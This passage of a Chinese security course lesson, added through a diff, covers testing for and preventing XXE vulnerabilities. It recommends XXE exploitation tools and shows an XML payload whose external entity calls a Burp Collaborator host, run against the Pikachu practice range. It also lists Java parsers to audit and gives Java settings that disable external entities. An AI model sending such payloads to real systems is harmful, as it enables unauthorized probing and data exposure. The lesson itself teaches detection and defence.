+Cache-Control: max-age=259200
+Connection: keep-alive
+</span></code></pre>
+<p data-nodeid="1098">常用命令如下：<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAABwiAda6kAAF5gVHcGUo024.png" alt="Drawing 3.png" data-nodeid="1222"></p>
+<div data-nodeid="1099"><p style="text-align:center">图 4  XXEinjector 常用命令</p></div>
+<p data-nodeid="1100">不过，不能完全依赖于 XXEinjector，因为之前我在测试时，发现它也有利用不成功的情况，需要自己多测试验证下。</p>
+<p data-nodeid="1101">其他更多 XXE payload，可以参考<a href="https://github.com/payloadbox/xxe-injection-payload-list" data-nodeid="1227">“XML External Entity (XXE) Injection Payload List”</a>。</p>
+<h4 data-nodeid="1102">2.XXExploiter</h4>
+<p data-nodeid="1103">如果你记不住上面那些 XXE payload，还有个工具可以帮你生成，一款集 payload 生成与发包利用的 XXE 利用工具 <a href="https://github.com/luisfontes19/xxexploiter" data-nodeid="1233">XXExploiter</a>，它可以启动服务提供远程 DTD 文件去实现利用。</p>
+<p data-nodeid="4339" class=""><img src="https://s0.lgstatic.com/i/image2/M01/06/D8/CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png" alt="图片5.png" data-nodeid="4343"></p>
+<div data-nodeid="4340"><p style="text-align:center">图 5   xxeploiter 利用方法</p></div>
+
+
+
+
+
+
+<p data-nodeid="1106">就功能而言，个人觉得它比 XXEinjector 更优秀，生成 payload 的功能还可以用于辅助手工测试，结合业务场景自己做一些调整。</p>
+<h3 data-nodeid="1107">XXE 漏洞挖掘</h3>
+<h4 data-nodeid="1108">1.黑盒测试</h4>
+<p data-nodeid="1109">XXE 依然如 SSRF 分为有回显、无回显。通过 XXE 可以造成 SSRF，所以它的检测思路与 SSRF 大同小异，比较通用的方式也是构造特定外网服务器的访问请求，然后查询外网服务器的请求日志，以判断是否请求成功。</p>
+<p data-nodeid="1110">无论是手工测试还是自动化，当前检测 XXE 和 SSRF 漏洞的方式大多是基于此原理。</p>
+<p data-nodeid="1111">上一讲介绍的 Burp Collaborator，在此处就用得上，使用前面介绍的常见攻击手段，去尝试构造多种测试请求，是否向 Burp Collaborator Server 请求成功，就可以很容易地判断是否存在 XXE。</p>
+<p data-nodeid="1112">以 Pikachu 靶场的 XXE 题目为例。用 Burp Collaborator 获得 DNS 解析服务器的地址 b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net，然后构造 XXE payload。</p>
+<pre class="lang-xml" data-nodeid="1113"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>
+</code></pre>
+<p data-nodeid="5360" class="">将上述 payload 输入文本框，点“提交”：<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWgSAfTxdAAR6XBUFZa4113.png" alt="图片6.png" data-nodeid="5366"></p>
+<div data-nodeid="5361" class="te-preview-highlight"><p style="text-align:center">图 6  输入 xml payload</p></div>
+
+
+
+
+<p data-nodeid="1116">在 Burp Collaborator client 上点击“Poll now”就可以看到请求日志，说明确实存在 XXE 漏洞。</p>
+<p data-nodeid="1117"><img src="https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAAByaANi3-AAE7G8SiyNI515.png" alt="Drawing 6.png" data-nodeid="1253"></p>
+<div data-nodeid="1118"><p style="text-align:center">图 7  利用 XXE 请求 Collaborator server 成功</p></div>
+<h4 data-nodeid="1119">2.白盒审计</h4>
+<p data-nodeid="1120">以 Java 为例，可以在代码中搜索常用的 XML 解析器，看它们在实例化之后，是否有关闭外部实体引用功能，如果没有就可能存在 XXE 漏洞。</p>
+<pre class="lang-java" data-nodeid="1121"><code data-language="java">javax.xml.parsers.DocumentBuilderFactory;
+javax.xml.parsers.SAXParser
+javax.xml.transform.TransformerFactory
+javax.xml.validation.Validator
+javax.xml.validation.SchemaFactory
+javax.xml.transform.sax.SAXTransformerFactory
+javax.xml.transform.sax.SAXSource
+org.xml.sax.XMLReader
+DocumentHelper.parseText
+DocumentBuilder
+org.xml.sax.helpers.XMLReaderFactory
+org.dom4j.io.SAXReader
+org.jdom.input.SAXBuilder
+org.jdom2.input.SAXBuilder
+javax.xml.bind.Unmarshaller
+javax.xml.xpath.XpathExpression
+javax.xml.stream.XMLStreamReader
+org.apache.commons.digester3.Digester
+rg.xml.sax.SAXParseExceptionpublicId
+</code></pre>
+<p data-nodeid="1122">这部分可以结合<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" data-nodeid="1259">“XML External Entity Prevention Cheat Sheet”</a>来看，不同语言、不同的 XML 解析库有不同的关闭外部实体引用的方法，在代码审计时，可以对照着看，然后拿一些 xxe payload 实际验证下。</p>
+<h3 data-nodeid="1123">防御 XXE 漏洞</h3>
+<p data-nodeid="1124">要防御 XXE 也比较简单，<strong data-nodeid="1267">关闭外部实体引用即可</strong>。比如在 Java 中常用于解析 XML 的 DocumentBuilderFactory，就可以通过 setFeature 方法防御 XXE 漏洞，注意是组合使用，而不是单一防御。</p>
+<pre class="lang-java" data-nodeid="1125"><code data-language="java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+String FEATURE = <span class="hljs-keyword">null</span>;
+<span class="hljs-keyword">try</span> {
+    <span class="hljs-comment">// 禁用DTD</span>
+    FEATURE = <span class="hljs-string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">true</span>);
+
+    <span class="hljs-comment">// 禁用普通实体</span>
+    FEATURE = <span class="hljs-string">"http://xml.org/sax/features/external-general-entities"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用参数实体</span>
+    FEATURE = <span class="hljs-string">"http://xml.org/sax/features/external-parameter-entities"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用外部DTD引用</span>
+    FEATURE = <span class="hljs-string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用XInclude处理功能</span>
+    dbf.setXIncludeAware(<span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用扩展实体引用节点，注意：只使用该方法并不能完全防御XXE</span>
+    dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);
+} <span class="hljs-keyword">catch</span> () {
+  ...
+}
+   <span class="hljs-comment">// Load XML file or stream using a XXE agnostic configured parser...</span>
+   DocumentBuilder safebuilder = dbf.newDocumentBuilder();
+</code></pre>
+<p data-nodeid="1126">不同的 XML 解析库有不同的关闭方式，比如全面介绍 XXE 防御方案的是 OWASP 发表的<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" data-nodeid="1271">“XML External Entity Prevention Cheat Sheet”</a>，针对不同的语言、XML 解析库，给出不同的防御方案，并提供关闭 XML 实体引用的代码示例，你在防御或者需要修复 XXE 漏洞时可以作为参考。</p>
+<p data-nodeid="1127">如果业务需要引用外部实体，建议采用白名单方式限制。</p>
+<h3 data-nodeid="1128">小结</h3>
+<p data-nodeid="1129">本节课介绍了 XXE（XML 实体注入）漏洞相关的基础知识、漏洞成因和常见攻击手段，有时需要根据有无回显的情况，采取不同的测试方法。</p>
+<blockquote data-nodeid="1130">
+<p data-nodeid="1131">在日常实际应用中，大家都习惯当作无回显的情况来看待，因为无回显的检测方法同样适用于有回显的，相对比较通用。</p>
+</blockquote>
+<p data-nodeid="1132">同时，给你推荐了 XXEinjector 和 XXExploiter 两款利用工具，在辅助检测 XXE 漏洞时会有所帮助。个人更偏好用 XXExploiter，因为它功能更多，利用成功率更高一些，还可以生成 payload 用于测试。</p>
+<p data-nodeid="1133" class="">Burp Collaborator&nbsp;在检测无回显的 XXE 漏洞时，非常好用，结合 XXExploiter 生成的 payload，对其中的 URL 调整为 Burp Collaborator&nbsp; Server，借助 Burp Collaborator 的自动检测服务端的请求日志，可以帮助判断漏洞是否存在，又不用再自己搭建外网服务器，是一种节约成本的检测方法。</p></div>
+
+</body></html>
